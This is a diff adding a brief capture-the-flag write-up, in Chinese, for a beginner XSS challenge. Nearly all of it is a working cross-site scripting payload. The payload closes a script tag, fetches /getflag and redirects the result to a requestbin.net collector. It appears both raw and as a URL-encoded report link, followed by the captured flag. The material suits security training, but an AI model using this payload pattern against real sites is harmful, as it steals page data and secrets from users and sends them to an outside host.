@@ -1,0 +1,8 @@
+1. 用requestbin或ngrok接請求 (https://requestbin.net/)
+</script><script>fetch(`/getflag`).then(r=>r.text()).then(flag=>location.href=`http://requestbin.net/r/93c9el7a/?${flag}`)//
+
+2. report
+http://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag`).then(r=%3Er.text()).then(flag=%3Elocation.href=`http://requestbin.net/r/93c9el7a/?${flag}`)//
+
+3.
+FLAG{b4by_xss_h4ck3r}
